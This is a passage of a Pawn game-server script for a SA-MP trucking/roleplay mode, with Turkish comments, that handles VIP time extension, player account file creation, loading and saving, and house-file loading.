				format(VIPBitis[playerid], 20, "%s.%d", VIPBitT, hour);

				format(tmp, 128, "{00FF00}PANEL, %s{F8F8FF}'in VIP üyelik süresini {00FF00}%d gün {F8F8FF}yaptý. Bitiþ: {00FF00}%d.%d.%d Saat %d:00",  GetName(playerid), vipgun, day, month, year, hour);
				SendClientMessageToAll(-1, tmp);

				format(tmp, 128, "PANEL %s'e %d gün VIP verdi. Bitiþ: %s",  GetName(playerid), vipgun, VIPBitis[playerid]);
				LOG(tmp);
				APlayerData[playerid][verilecekvip] = 0;
				}else{
				new tmp[128];
				new vipgun = APlayerData[playerid][verilecekvip];
	            new year, month, day, hour, VBParca[4][10], VIPBitT[20];
				split(VIPBitis[playerid], VBParca, '.');
				day = strval(VBParca[0]);
				month = strval(VBParca[1]);
				year = strval(VBParca[2]);
				hour = strval(VBParca[3]);
				format(VIPBitT, 20, GunEkle(vipgun, day, month, year));
				format(VIPBitis[playerid], 20, "%s.%d", VIPBitT, hour);

				split(VIPBitis[playerid], VBParca, '.');
				day = strval(VBParca[0]);
				month = strval(VBParca[1]);
				year = strval(VBParca[2]);
				hour = strval(VBParca[3]);

				format(tmp, 128, "{00FF00}PANEL, %s{F8F8FF}'in VIP üyelik süresini {00FF00}%d gün {F8F8FF}uzattý. Bitiþ: {00FF00}%d.%d.%d Saat: %d:00", GetName(playerid), vipgun, day, month, year, hour);
				SendClientMessageToAll(-1, tmp);

				format(tmp, 128, "PANEL, %s'in VIPini %d gün uzatti. Bitiþ: %s",  GetName(playerid), vipgun, VIPBitis[playerid]);
				LOG(tmp);
				}
	    	}

			 Oyuncu_Kaydet(playerid);
}*/
// ************************************************************************************************************************************************************
// PPC_FileOperations
// ************************************************************************************************************************************************************

// This function will create the player-datafile for the given player (only used when a new player joins the server)
/*PlayerFile_Create(playerid)
{
	new file[100], File:PFile, Name[24], LineForFile[500];
	format(Name, sizeof(Name), APlayerData[playerid][PlayerName]); // Get the playername
	format(file, sizeof(file), PlayerFile, Name); // Construct the complete filename for this player's account

	Sirket[playerid] = -1;

	PFile = fopen(file, io_write); // Open the playerfile for writing

	format(LineForFile, 500, "Password %s\r\n", APlayerData[playerid][PlayerPassword]); // Construct the line: "Password <playerpassword>"
	fwrite(PFile, LineForFile); // And save it to the file
	format(LineForFile, 500, "Level %i\r\n"); // Construct the line: "Level <playerlevel>"
	fwrite(PFile, LineForFile); // And save it to the file
	format(LineForFile, 500, "DjLevel %i\r\n"); // Construct the line: "Level <playerlevel>"
	fwrite(PFile, LineForFile); // And save it to the file
	format(LineForFile, 500, "DonLevel %i\r\n"); // Construct the line: "Level <playerlevel>"
	fwrite(PFile, LineForFile); // And save it to the file
	format(LineForFile, 500, "Jailed %i\r\n"); // Construct the line: "Jailed <playerjailed>"
	fwrite(PFile, LineForFile); // And save it to the file
	format(LineForFile, 500, "Wanted %i\r\n"); // Construct the line: "Wanted <wantedlevel>"
	fwrite(PFile, LineForFile); // And save it to the file
	format(LineForFile, 500, "Bans %i\r\n"); // Construct the line: "Bans <NumberOfBans>"
	fwrite(PFile, LineForFile); // And save it to the file
	format(LineForFile, 500, "BanTime %i\r\n"); // Construct the line: "BanTime <TimeToUnban>"
	fwrite(PFile, LineForFile); // And save it to the file
	format(LineForFile, 500, "TruckerLicense %i\r\n"); // Construct the line: "TruckerLicense <playertruckerlicense>"
	fwrite(PFile, LineForFile); // And save it to the file
	format(LineForFile, 500, "BusLicense %i\r\n"); // Construct the line: "BusLicense <playerbuslicense>"
	fwrite(PFile, LineForFile); // And save it to the file
	format(LineForFile, 100, "PilotLicense %i\r\n"); // Construct the line: "TruckerLicense <playertruckerlicense>"
	fwrite(PFile, LineForFile); // And save it to the file
	format(LineForFile, 100, "GemiciLicense %i\r\n"); // Construct the line: "TruckerLicense <playertruckerlicense>"
	fwrite(PFile, LineForFile); // And save it to the file
	format(LineForFile, 100, "MafiaLicense %i\r\n"); // Construct the line: "TruckerLicense <playertruckerlicense>"
	fwrite(PFile, LineForFile); // And save it to the file
	format(LineForFile, 500, "StatsMetersDriven %f\r\n".0); // Construct the line: "StatsMetersDriven <StatsMetersDriven>"
	fwrite(PFile, LineForFile); // And save it to the file
	format(LineForFile, 500, "StatsTruckerJobs %i\r\n"); // Construct the line: "StatsTruckerJobs <StatsTruckerJobs>"
	fwrite(PFile, LineForFile); // And save it to the file
	format(LineForFile, 500, "StatsConvoyJobs %i\r\n"); // Construct the line: "StatsConvoyJobs <StatsConvoyJobs>"
	fwrite(PFile, LineForFile); // And save it to the file
	format(LineForFile, 500, "StatsBusDriverJobs %i\r\n"); // Construct the line: "StatsBusDriverJobs <StatsBusDriverJobs>"
	fwrite(PFile, LineForFile); // And save it to the file
	format(LineForFile, 500, "StatsPilotJobs %i\r\n"); // Construct the line: "StatsPilotJobs <StatsPilotJobs>"
	fwrite(PFile, LineForFile); // And save it to the file
	format(LineForFile, 500, "StatsMafiaJobs %i\r\n"); // Construct the line: "StatsMafiaJobs <StatsMafiaJobs>"
	fwrite(PFile, LineForFile); // And save it to the file
    format(LineForFile, 100, "StatsGJobs %i\r\n"); // Construct the line: "StatsGJobs <StatsGJobs>"
	fwrite(PFile, LineForFile); // And save it to the file
	format(LineForFile, 100, "StatsBankaJobs %i\r\n"); // Construct the line: "StatsGJobs <StatsGJobs>"
	fwrite(PFile, LineForFile); // And save it to the file
	format(LineForFile, 100, "StatsFireJobs %i\r\n"); // Construct the line: "StatsGJobs <StatsGJobs>"
	fwrite(PFile, LineForFile); // And save it to the file
	format(LineForFile, 500, "StatsMafiaStolen %i\r\n"); // Construct the line: "StatsMafiaStolen <StatsMafiaStolen>"
	fwrite(PFile, LineForFile); // And save it to the file
	format(LineForFile, 500, "StatsPoliceFined %i\r\n"); // Construct the line: "StatsPoliceFined <StatsPoliceFined>"
	fwrite(PFile, LineForFile); // And save it to the file
	format(LineForFile, 500, "StatsPoliceJailed %i\r\n"); // Construct the line: "StatsPoliceJailed <StatsPoliceJailed>"
	fwrite(PFile, LineForFile); // And save it to the file
	format(LineForFile, 100, "StatsFBYFined %i\r\n"); // Construct the line: "StatsFBYFined <StatsFBYFined>"
	fwrite(PFile, LineForFile); // And save it to the file
	format(LineForFile, 100, "StatsFBYJailed %i\r\n"); // Construct the line: "StatsFBYJailed <StatsFBYJailed>"
	fwrite(PFile, LineForFile); // And save it to the file
	format(LineForFile, 500, "Money %i\r\n"); // Construct the line: "Money <playermoney>"
	fwrite(PFile, LineForFile); // And save it to the file
	format(LineForFile, 500, "Score %i\r\n"); // Construct the line: "Score <playerscore>"
	fwrite(PFile, LineForFile); // And save it to the file
	format(LineForFile, 500, "Sirket %d\r\n", -1); // Construct the line: "Sirket <sirket>"
	fwrite(PFile, LineForFile); // And save it to the file
	format(LineForFile, 500, "SirketRutbe %d\r\n"); // Construct the line: "SirketRutbe <sirketrutbe>"
	fwrite(PFile, LineForFile); // And save it to the file
	format(LineForFile, 500, "SirketKatki %d\r\n"); // Construct the line: "SirketRutbe <sirketrutbe>"
	fwrite(PFile, LineForFile); // And save it to the file
	format(LineForFile, 500, "GizliKasa %d\r\n"); // Construct the line: "SirketRutbe <sirketrutbe>"
	fwrite(PFile, LineForFile); // And save it to the file
	format(LineForFile, 500, "GizliKasaI %s\r\n", SaveSakliKasaInfoToString(playerid)); // Construct the line: "SirketRutbe <sirketrutbe>"
	fwrite(PFile, LineForFile); // And save it to the file
	format(LineForFile, 500, "VIP %s\r\n", "Yok"); // Construct the line: "SirketRutbe <sirketrutbe>"
	fwrite(PFile, LineForFile); // And save it to the file
	format(LineForFile, 500, "Rank %d\r\n"); // Construct the line: "SirketRutbe <sirketrutbe>"
	fwrite(PFile, LineForFile); // And save it to the file
	format(LineForFile, 500, "MeslekY %d\r\n"); // Construct the line: "SirketRutbe <sirketrutbe>"
	fwrite(PFile, LineForFile); // And save it to the file

	// Rekor Ölçüm Sistemi
	new g, a, y, sa, d, sn;
	getdate(y, a, g);
	gettime(sa, d, sn);
	format(KayitTarihi[playerid], 50, "%d/%d/%d %d:%d:%d", g, a, y, sa, d, sn);
	format(LineForFile, 500, "KayitT %s\r\n", KayitTarihi[playerid]); // Construct the line: "SirketRutbe <sirketrutbe>"
	fwrite(PFile, LineForFile); // And save it to the file
	format(LineForFile, 500, "SonG %s\r\n", KayitTarihi[playerid]); // Construct the line: "SirketRutbe <sirketrutbe>"
	fwrite(PFile, LineForFile); // And save it to the file

	pGun[playerid]=0; pSaat[playerid]=0; pDakika[playerid]=0; pSaniye[playerid]=0;
	format(LineForFile, 500, "OnlineS %d|%d|%d|%d\r\n", 0, 0, 0); // Construct the line: "SirketRutbe <sirketrutbe>"
	fwrite(PFile, LineForFile); // And save it to the file

	fclose(PFile); // Close the file

	return 1;
}

// This function will load the player's datafile (used when a player connects to the server)
PlayerFile_Load(playerid)
{
	// Setup local variables
	new file[100], File:PFile, Name[24], LineFromFile[500], ParameterName[50], ParameterValue[400];

	format(Name, sizeof(Name), APlayerData[playerid][PlayerName]); // Get the playername
	format(file, sizeof(file), PlayerFile, Name); // Construct the complete filename for this player's account

	// Check if the player's datafile exists
	if (fexist(file))
	{
		PFile = fopen(file, io_read); // Open the playerfile for reading

		fread(PFile, LineFromFile); // Read the first line of the file

		// Keep reading until the end of the file is found (no more data)
		while (strlen(LineFromFile) > 0)
		{
			StripNewLine(LineFromFile); // Strip any newline characters from the LineFromFile
			sscanf(LineFromFile, "s[50]s[50]", ParameterName, ParameterValue); // Extract parametername and parametervalue

			// Store the proper value in the proper place
			if (strcmp(ParameterName, "Password", false) == 0) // If the parametername is correct ("Password")
			    format(APlayerData[playerid][PlayerPassword], 350, ParameterValue); // Store the password
			if (strcmp(ParameterName, "APassword", false) == 0) // If the parametername is correct ("Password")
			    format(APlayerData[playerid][PlayerAdmPassword], 350, ParameterValue); // Store the password
			if (strcmp(ParameterName, "Level", false) == 0) // If the parametername is correct ("Level")
			    APlayerData[playerid][PlayerFLevel] = strval(ParameterValue); // Store the playerlevel
   			if (strcmp(ParameterName, "DjLevel", false) == 0) // If the parametername is correct ("Level")
			    APlayerData[playerid][PlayerDjLevel] = strval(ParameterValue); // Store the playerlevel
   			if (strcmp(ParameterName, "DonLevel", false) == 0) // If the parametername is correct ("Level")
			    APlayerData[playerid][PlayerDonLevel] = strval(ParameterValue); // Store the playerlevel
			if (strcmp(ParameterName, "Jailed", false) == 0) // If the parametername is correct ("Jailed")
			    APlayerData[playerid][PlayerJailed] = strval(ParameterValue); // Store the jailed-status
			if (strcmp(ParameterName, "Wanted", false) == 0) // If the parametername is correct ("Wanted")
			    APlayerData[playerid][PlayerWanted] = strval(ParameterValue); // Set the wanted-status
			if (strcmp(ParameterName, "Bans", false) == 0) // If the parametername is correct ("Bans")
			    APlayerData[playerid][Bans] = strval(ParameterValue); // Store the bans
			if (strcmp(ParameterName, "BanTime", false) == 0) // If the parametername is correct ("BanTime")
			    APlayerData[playerid][BanTime] = strval(ParameterValue); // Store the bantime
			if (strcmp(ParameterName, "TruckerLicense", false) == 0) // If the parametername is correct ("TruckerLicense")
			    APlayerData[playerid][TruckerLicense] = strval(ParameterValue); // Store the TruckerLicense
			if (strcmp(ParameterName, "BusLicense", false) == 0) // If the parametername is correct ("BusLicense")
			    APlayerData[playerid][BusLicense] = strval(ParameterValue); // Store the BusLicense
			if (strcmp(ParameterName, "PilotLicense", false) == 0) // If the parametername is correct ("TruckerLicense")
			    APlayerData[playerid][PilotLicense] = strval(ParameterValue); // Store the TruckerLicense
			if (strcmp(ParameterName, "GemiciLicense", false) == 0) // If the parametername is correct ("TruckerLicense")
			    APlayerData[playerid][GemiciLicense] = strval(ParameterValue); // Store the TruckerLicense
   			if (strcmp(ParameterName, "MafiaLicense", false) == 0) // If the parametername is correct ("TruckerLicense")
			    APlayerData[playerid][MafiaLicense] = strval(ParameterValue); // Store the TruckerLicense

			if (strcmp(ParameterName, "Muted", false) == 0) // If the parametername is correct ("Muted")
			{
			    if (strcmp(ParameterValue, "Yes", false) == 0) // If the value "Yes" was read
					APlayerData[playerid][Muted] = true; // Player is muted
				else
					APlayerData[playerid][Muted] = false; // Player is not muted
			}
			if (strcmp(ParameterName, "RulesRead", false) == 0) // If the parametername is correct ("RulesRead")
			{
			    if (strcmp(ParameterValue, "Yes", false) == 0) // If the value "Yes" was read
					APlayerData[playerid][RulesRead] = true; // Player has accepted the rules
				else
					APlayerData[playerid][RulesRead] = false; // Player hasn't accepted the rules yet
			}

			if (strcmp(ParameterName, "StatsMetersDriven", false) == 0) // If the parametername is correct ("StatsMetersDriven")
			    APlayerData[playerid][StatsMetersDriven] = floatstr(ParameterValue); // Store the StatsMetersDriven
			if (strcmp(ParameterName, "StatsTruckerJobs", false) == 0) // If the parametername is correct ("StatsTruckerJobs")
			    APlayerData[playerid][StatsTruckerJobs] = strval(ParameterValue); // Store the StatsTruckerJobs
			if (strcmp(ParameterName, "StatsConvoyJobs", false) == 0) // If the parametername is correct ("StatsConvoyJobs")
			    APlayerData[playerid][StatsConvoyJobs] = strval(ParameterValue); // Store the StatsConvoyJobs
			if (strcmp(ParameterName, "StatsBusDriverJobs", false) == 0) // If the parametername is correct ("StatsBusDriverJobs")
			    APlayerData[playerid][StatsBusDriverJobs] = strval(ParameterValue); // Store the StatsBusDriverJobs
			if (strcmp(ParameterName, "StatsPilotJobs", false) == 0) // If the parametername is correct ("StatsPilotJobs")
			    APlayerData[playerid][StatsPilotJobs] = strval(ParameterValue); // Store the StatsPilotJobs
			if (strcmp(ParameterName, "StatsMafiaJobs", false) == 0) // If the parametername is correct ("StatsMafiaJobs")
			    APlayerData[playerid][StatsMafiaJobs] = strval(ParameterValue); // Store the StatsMafiaJobs
			if (strcmp(ParameterName, "StatsMafiaStolen", false) == 0) // If the parametername is correct ("StatsMafiaStolen")
			    APlayerData[playerid][StatsMafiaStolen] = strval(ParameterValue); // Store the StatsMafiaStolen
			if (strcmp(ParameterName, "StatsPoliceFined", false) == 0) // If the parametername is correct ("StatsPoliceFined")
			    APlayerData[playerid][StatsPoliceFined] = strval(ParameterValue); // Store the StatsPoliceFined
			if (strcmp(ParameterName, "StatsPoliceJailed", false) == 0) // If the parametername is correct ("StatsPoliceJailed")
			    APlayerData[playerid][StatsPoliceJailed] = strval(ParameterValue); // Store the StatsPoliceJailed
			if (strcmp(ParameterName, "StatsFBYFined", false) == 0) // If the parametername is correct ("StatsFBYFined")
			    APlayerData[playerid][StatsFBYFined] = strval(ParameterValue); // Store the StatsFBYFined
			if (strcmp(ParameterName, "StatsFBYJailed", false) == 0) // If the parametername is correct ("StatsFBYJailed")
			    APlayerData[playerid][StatsFBYJailed] = strval(ParameterValue); // Store the StatsFBYJailed
			if (strcmp(ParameterName, "StatsRoadworkerJobs", false) == 0) // If the parametername is correct ("StatsRoadworkerJobs")
			    APlayerData[playerid][StatsRoadworkerJobs] = strval(ParameterValue); // Store the StatsRoadworkerJobs
			if (strcmp(ParameterName, "StatsGemiciJobs", false) == 0) // If the parametername is correct ("StatsGemiciJobs")
			    APlayerData[playerid][StatsGemiciJobs] = strval(ParameterValue); // Store the StatsGemiciJobs
            if (strcmp(ParameterName, "StatsGJobs", false) == 0) // If the parametername is correct ("StatsGJobs")
			    APlayerData[playerid][StatsGJobs] = strval(ParameterValue); // Store the StatsGJobs
   			if (strcmp(ParameterName, "StatsBankaJobs", false) == 0) // If the parametername is correct ("StatsGJobs")
			    APlayerData[playerid][StatsBankaJobs] = strval(ParameterValue); // Store the StatsGJobs
		    if (strcmp(ParameterName, "StatsFireJobs", false) == 0) // If the parametername is correct ("StatsGJobs")
			    APlayerData[playerid][StatsFireJobs] = strval(ParameterValue); // Store the StatsGJobs
			if (strcmp(ParameterName, "StatsOduncuJobs", false) == 0) // If the parametername is correct ("StatsOduncuJobs")
			    APlayerData[playerid][StatsOduncuJobs] = strval(ParameterValue); // Store the StatsOduncuJobs
			if (strcmp(ParameterName, "StatsBalikciJobs", false) == 0) // If the parametername is correct ("StatsOduncuJobs")
			    APlayerData[playerid][StatsBalikciJobs] = strval(ParameterValue); // Store the StatsOduncuJobs


			if (strcmp(ParameterName, "Money", false) == 0) // If the parametername is correct ("Money")
				APlayerData[playerid][PlayerMoney] = strval(ParameterValue); // Store the money
			if (strcmp(ParameterName, "Score", false) == 0) // If the parametername is correct ("Score")
				APlayerData[playerid][PlayerScore] = strval(ParameterValue); // Store the score

			if (strcmp(ParameterName, "Sirket", false) == 0) // If the parametername is correct ("Sirket")
				Sirket[playerid] = strval(ParameterValue);
			if (strcmp(ParameterName, "SirketRutbe", false) == 0) // If the parametername is correct ("Rutbe")
				SirketRutbe[playerid] = strval(ParameterValue);
			if (strcmp(ParameterName, "SirketKatki", false) == 0) // If the parametername is correct ("Rutbe")
				SirketKatki[playerid] = strval(ParameterValue);
			if (strcmp(ParameterName, "GizliKasa", false) == 0) // If the parametername is correct ("Rutbe")
				SakliKasaTamam[playerid] = strval(ParameterValue);
			if (strcmp(ParameterName, "GizliKasaI", false) == 0) // If the parametername is correct ("Rutbe")
				LoadSakliKasaInfoFromString(playerid, ParameterValue);
			if (strcmp(ParameterName, "VIP", false) == 0) // If the parametername is correct ("Rutbe")
				format(VIPBitis[playerid], 20, ParameterValue);
			if (strcmp(ParameterName, "Rank", false) == 0) // If the parametername is correct ("Rutbe")
				Rank[playerid] = strval(ParameterValue);
			if (strcmp(ParameterName, "MeslekY", false) == 0) // If the parametername is correct ("Rutbe")
				MeslekdeYaparmis[playerid] = strval(ParameterValue);

			// Rekor Ölçüm Sistemi
			if (strcmp(ParameterName, "KayitT", false) == 0) // If the parametername is correct ("Rutbe")
				format(KayitTarihi[playerid], 50, ParameterValue);
			if (strcmp(ParameterName, "SonG", false) == 0) // If the parametername is correct ("Rutbe")
				format(SonGiris[playerid], 50, ParameterValue);

			new EvoturK[80], EvoreyiZ[4][10];

			if (strcmp(ParameterName, "OnlineS", false) == 0) // If the parametername is correct ("Rutbe")
				format(EvoturK, 80, ParameterValue);
			split(EvoturK, EvoreyiZ, '|');
			pGun[playerid] = strval(EvoreyiZ[0]);
			pSaat[playerid] = strval(EvoreyiZ[1]);
			pDakika[playerid] = strval(EvoreyiZ[2]);
			pSaniye[playerid] = strval(EvoreyiZ[3]);
			// Ben gerekeni yaptým ben kaybolacam xd

			fread(PFile, LineFromFile); // Read the next line of the file
		}

		fclose(PFile); // Close the file

		if(APlayerData[playerid][PlayerLevel] > 7) APlayerData[playerid][PlayerLevel] = 7;

		return 1; // Return if the file was read correctly
	}
	else
	    return 0; // Return 0 if the file couldn't be read (doesn't exist)
}

// This function will save all player-data (used when the player disconnects from the server)
PlayerFile_Save(playerid)
{
	new file[100], File:PFile, Name[24], LineForFile[500];
	format(Name, sizeof(Name), APlayerData[playerid][PlayerName]); // Get the playername
	format(file, sizeof(file), PlayerFile, Name); // Construct the complete filename for this player's account

	PFile = fopen(file, io_write); // Open the playerfile for writing

	format(LineForFile, 500, "Password %s\r\n", APlayerData[playerid][PlayerPassword]); // Construct the line: "Password <playerpassword>"
	fwrite(PFile, LineForFile); // And save it to the file
	format(LineForFile, 500, "APassword %s\r\n", APlayerData[playerid][PlayerAdmPassword]); // Construct the line: "Password <playerpassword>"
	fwrite(PFile, LineForFile); // And save it to the file
	format(LineForFile, 500, "Level %i\r\n", APlayerData[playerid][PlayerFLevel]); // Construct the line: "Level <playerlevel>"
	fwrite(PFile, LineForFile); // And save it to the file
	format(LineForFile, 500, "DjLevel %i\r\n", APlayerData[playerid][PlayerDjLevel]); // Construct the line: "Level <playerlevel>"
	fwrite(PFile, LineForFile); // And save it to the file
	format(LineForFile, 500, "DonLevel %i\r\n", APlayerData[playerid][PlayerDonLevel]); // Construct the line: "Level <playerlevel>"
	fwrite(PFile, LineForFile); // And save it to the file
	format(LineForFile, 500, "Jailed %i\r\n", APlayerData[playerid][PlayerJailed]); // Construct the line: "Jailed <playerjailed>"
	fwrite(PFile, LineForFile); // And save it to the file
	format(LineForFile, 500, "Wanted %i\r\n", APlayerData[playerid][PlayerWanted]); // Construct the line: "Wanted <wantedlevel>"
	fwrite(PFile, LineForFile); // And save it to the file
	format(LineForFile, 500, "Bans %i\r\n", APlayerData[playerid][Bans]); // Construct the line: "Bans <NumberOfBans>"
	fwrite(PFile, LineForFile); // And save it to the file
	format(LineForFile, 500, "BanTime %i\r\n", APlayerData[playerid][BanTime]); // Construct the line: "BanTime <TimeToUnban>"
	fwrite(PFile, LineForFile); // And save it to the file
	format(LineForFile, 500, "TruckerLicense %i\r\n", APlayerData[playerid][TruckerLicense]); // Construct the line: "TruckerLicense <playertruckerlicense>"
	fwrite(PFile, LineForFile); // And save it to the file
	format(LineForFile, 500, "BusLicense %i\r\n", APlayerData[playerid][BusLicense]); // Construct the line: "BusLicense <playerbuslicense>"
	fwrite(PFile, LineForFile); // And save it to the file
	format(LineForFile, 100, "PilotLicense %i\r\n", APlayerData[playerid][PilotLicense]); // Construct the line: "TruckerLicense <playertruckerlicense>"
	fwrite(PFile, LineForFile); // And save it to the file
	format(LineForFile, 100, "GemiciLicense %i\r\n", APlayerData[playerid][GemiciLicense]); // Construct the line: "TruckerLicense <playertruckerlicense>"
	fwrite(PFile, LineForFile); // And save it to the file
	format(LineForFile, 100, "MafiaLicense %i\r\n", APlayerData[playerid][MafiaLicense]); // Construct the line: "TruckerLicense <playertruckerlicense>"
	fwrite(PFile, LineForFile); // And save it to the file

	if (APlayerData[playerid][Muted] == true) // Check if the player is muted
		format(LineForFile, 500, "Muted Yes\r\n"); // Construct the line: "Muted <Yes>"
	else
		format(LineForFile, 500, "Muted No\r\n"); // Construct the line: "Muted <No>"
	fwrite(PFile, LineForFile); // And save it to the file

	if (APlayerData[playerid][RulesRead] == true) // Check if the player has accepted the rules
		format(LineForFile, 500, "RulesRead Yes\r\n"); // Construct the line: "RulesRead <Yes>"
	else
		format(LineForFile, 500, "RulesRead No\r\n"); // Construct the line: "RulesRead <No>"
	fwrite(PFile, LineForFile); // And save it to the file

	format(LineForFile, 500, "StatsMetersDriven %f\r\n", APlayerData[playerid][StatsMetersDriven]); // Construct the line: "StatsMetersDriven <StatsMetersDriven>"
	fwrite(PFile, LineForFile); // And save it to the file
	format(LineForFile, 500, "StatsTruckerJobs %i\r\n", APlayerData[playerid][StatsTruckerJobs]); // Construct the line: "StatsTruckerJobs <StatsTruckerJobs>"
	fwrite(PFile, LineForFile); // And save it to the file
	format(LineForFile, 500, "StatsConvoyJobs %i\r\n", APlayerData[playerid][StatsConvoyJobs]); // Construct the line: "StatsConvoyJobs <StatsConvoyJobs>"
	fwrite(PFile, LineForFile); // And save it to the file
	format(LineForFile, 500, "StatsBusDriverJobs %i\r\n", APlayerData[playerid][StatsBusDriverJobs]); // Construct the line: "StatsBusDriverJobs <StatsBusDriverJobs>"
	fwrite(PFile, LineForFile); // And save it to the file
	format(LineForFile, 500, "StatsPilotJobs %i\r\n", APlayerData[playerid][StatsPilotJobs]); // Construct the line: "StatsPilotJobs <StatsPilotJobs>"
	fwrite(PFile, LineForFile); // And save it to the file
	format(LineForFile, 500, "StatsMafiaJobs %i\r\n", APlayerData[playerid][StatsMafiaJobs]); // Construct the line: "StatsMafiaJobs <StatsMafiaJobs>"
	fwrite(PFile, LineForFile); // And save it to the file
	format(LineForFile, 500, "StatsMafiaStolen %i\r\n", APlayerData[playerid][StatsMafiaStolen]); // Construct the line: "StatsMafiaStolen <StatsMafiaStolen>"
	fwrite(PFile, LineForFile); // And save it to the file
	format(LineForFile, 500, "StatsPoliceFined %i\r\n", APlayerData[playerid][StatsPoliceFined]); // Construct the line: "StatsPoliceFined <StatsPoliceFined>"
	fwrite(PFile, LineForFile); // And save it to the file
	format(LineForFile, 500, "StatsPoliceJailed %i\r\n", APlayerData[playerid][StatsPoliceJailed]); // Construct the line: "StatsPoliceJailed <StatsPoliceJailed>"
	fwrite(PFile, LineForFile); // And save it to the file
	format(LineForFile, 100, "StatsFBYFined %i\r\n", APlayerData[playerid][StatsFBYFined]); // Construct the line: "StatsFBYFined <StatsFBYFined>"
	fwrite(PFile, LineForFile); // And save it to the file
	format(LineForFile, 100, "StatsFBYJailed %i\r\n", APlayerData[playerid][StatsFBYJailed]); // Construct the line: "StatsFBYJailed <StatsFBYJailed>"
	fwrite(PFile, LineForFile); // And save it to the file
	format(LineForFile, 500, "StatsRoadworkerJobs %i\r\n", APlayerData[playerid][StatsRoadworkerJobs]); // Construct the line: "StatsRoadworkerJobs <StatsRoadworkerJobs>"
	fwrite(PFile, LineForFile); // And save it to the file
	format(LineForFile, 500, "StatsGemiciJobs %i\r\n", APlayerData[playerid][StatsGemiciJobs]); // Construct the line: "StatsRoadworkerJobs <StatsRoadworkerJobs>"
	fwrite(PFile, LineForFile); // And save it to the file
	format(LineForFile, 100, "StatsGJobs %i\r\n", APlayerData[playerid][StatsGJobs]); // Construct the line: "StatsGJobs <StatsGJobs>"
	fwrite(PFile, LineForFile); // And save it to the file
	format(LineForFile, 100, "StatsBankaJobs %i\r\n", APlayerData[playerid][StatsBankaJobs]); // Construct the line: "StatsGJobs <StatsGJobs>"
	fwrite(PFile, LineForFile); // And save it to the file
	format(LineForFile, 100, "StatsFireJobs %i\r\n", APlayerData[playerid][StatsFireJobs]); // Construct the line: "StatsGJobs <StatsGJobs>"
	fwrite(PFile, LineForFile); // And save it to the file
	format(LineForFile, 500, "StatsOduncuJobs %i\r\n", APlayerData[playerid][StatsOduncuJobs]); // Construct the line: "StatsRoadworkerJobs <StatsRoadworkerJobs>"
	fwrite(PFile, LineForFile); // And save it to the file
	format(LineForFile, 500, "StatsBalikciJobs %i\r\n", APlayerData[playerid][StatsBalikciJobs]); // Construct the line: "StatsRoadworkerJobs <StatsRoadworkerJobs>"
	fwrite(PFile, LineForFile); // And save it to the file


	format(LineForFile, 500, "Money %i\r\n", APlayerData[playerid][PlayerMoney]); // Construct the line: "Money <playermoney>"
	fwrite(PFile, LineForFile); // And save it to the file
	format(LineForFile, 500, "Score %i\r\n", APlayerData[playerid][PlayerScore]); // Construct the line: "Score <playerscore>"
	fwrite(PFile, LineForFile); // And save it to the file

	format(LineForFile, 500, "Sirket %d\r\n", Sirket[playerid]);
	fwrite(PFile, LineForFile);
	format(LineForFile, 500, "SirketRutbe %d\r\n", SirketRutbe[playerid]);
	fwrite(PFile, LineForFile);
	format(LineForFile, 500, "SirketKatki %d\r\n", SirketKatki[playerid]);
	fwrite(PFile, LineForFile);
	format(LineForFile, 500, "GizliKasa %d\r\n", SakliKasaTamam[playerid]);
	fwrite(PFile, LineForFile);
	format(LineForFile, 500, "GizliKasaI %s\r\n", SaveSakliKasaInfoToString(playerid));
	fwrite(PFile, LineForFile);
	format(LineForFile, 500, "VIP %s\r\n", VIPBitis[playerid]);
	fwrite(PFile, LineForFile);
	format(LineForFile, 500, "Rank %d\r\n", Rank[playerid]);
	fwrite(PFile, LineForFile);
	format(LineForFile, 500, "MeslekY %d\r\n", MeslekdeYaparmis[playerid]);
	fwrite(PFile, LineForFile);

	// Rekor Ölçüm Sistemi
	format(LineForFile, 500, "KayitT %s\r\n", KayitTarihi[playerid]);
	fwrite(PFile, LineForFile);

	format(LineForFile, 500, "SonG %s\r\n", SonGiris[playerid]);
	fwrite(PFile, LineForFile);

	format(LineForFile, 500, "OnlineS %d|%d|%d|%d\r\n", pGun[playerid], pSaat[playerid], pDakika[playerid], pSaniye[playerid]);
	fwrite(PFile, LineForFile);
	// ben gerekeni yaptým ben gidiyorum
	fclose(PFile); // Close the file

	// Also save the houses that this player owns
    Player_LoadHouses(playerid);
	for (new i; i < MAX_HOUSESPERPLAYER; i++)
	{
		// Check if there is a valid house-id in this slot
		if (APlayerData[playerid][Houses][i] != 0)
		{
		    // Save the house (and linked vehicles)
		    HouseFile_Save(APlayerData[playerid][Houses][i]);
		}
	}
	// Save all the valid business-id's
	Player_LoadBusiness(playerid);
	for (new i; i < MAX_BUSINESSPERPLAYER; i++)
	{
		// Check if there is a valid business-id in this slot
		if (APlayerData[playerid][Business][i] != 0)
		{
		    // Save the business
		    BusinessFile_Save(APlayerData[playerid][Business][i]);
		}
	}

	return 1;
}
*/

new evID = 1;

// This function loads all houses
Housing_LoadAll()
{
	// Loop through all houses and try to load them
	for (new HouseID = 1; HouseID < MAX_HOUSES; HouseID++)
	{
	    // Try to load the file and check if it was succesfully loaded (file exists)
		if (HouseFile_Load(HouseID) == 1)
		{
			// Add a pickup and 3DText for this house
			// House_CreateEntrance(HouseID);
			// Count the amount of houses that are loaded
		    TotalHouses++;
		    evID++;
		}
	}

	return 1;
}

// This function will fHouseFile_Loadload the house's datafile (used when the server is started to load all houses)
HouseFile_Load(HouseID/*, bool:OnlyLoadVehicles = false*/)
{
	new file[100], File:HFile, LineFromFile[100], ParameterName[50], ParameterValue[50], AracSayisi;
	// Setup local variables
	new cModel, cPaint, components[14], Float:cx, Float:cy, Float:cz, Float:crot, Col1, Col2, vid, bool:VehicleClamped, cFuel = -1, Neons;

	format(file, sizeof(file), HouseFile, HouseID); // Construct the complete filename for this house-file

	if (fexist(file))
	{
		HFile = fopen(file, io_read); // Open the housefile for reading

		fread(HFile, LineFromFile); // Read the first line of the file

		// Set the house so it cannot be entered by anyone, except the owner (close the house)
		AHouseData[HouseID][HouseOpened] = false;

		// Keep reading until the end of the file is found (no more data)
		while (strlen(LineFromFile) > 0)
		{
			StripNewLine(LineFromFile); // Strip any newline characters from the LineFromFile
			sscanf(LineFromFile, "s[50]s[50]", ParameterName, ParameterValue); // Extract parametername and parametervalue

			// If OnlyLoadVehicles is "false", only load the house-data
			// If OnlyLoadVehicles is "true", only load the vehicle-data
			/*if (OnlyLoadVehicles == false)
			{*/
				// Store the proper value in the proper place
